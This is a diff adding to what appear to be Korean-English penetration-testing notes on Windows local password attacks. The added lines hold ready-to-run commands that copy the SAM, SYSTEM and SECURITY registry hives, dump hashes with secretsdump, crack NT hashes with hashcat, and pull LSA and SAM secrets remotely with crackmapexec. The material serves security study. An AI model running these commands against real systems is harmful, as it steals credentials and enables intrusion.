@@ -139,4 +139,24 @@ $! c so0 sa@
 <br/><br/>
 # Windows Local Password Attacks
 
+### Attacking SAM
+#### reg.exe로 Registry Hives 복사
+```
+reg.exe save hklm\sam C:\sam.save
+reg.exe save hklm\system C:\system.save
+reg.exe save hklm\security C:\security.save
+```
+
+#### Impacket's secretsdump.py로 Dumping Hashes
+```secretsdump.py -sam sam.save -security security.save -system system.save LOCAL```<br/>
+secretsdump 출력 : (uid:rid:lmhash:nthash)
+
+#### Hashcat으로 Cracking Hashes (NT Hash)
+```hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt```
+
+### Remote Dumping
+```crackmapexec smb 192.168.1.1 --local-auth -u <user> -p <password> --lsa```
+```crackmapexec smb 192.168.1.1 --local-auth -u <user> -p <password> --sam```
+
+
 
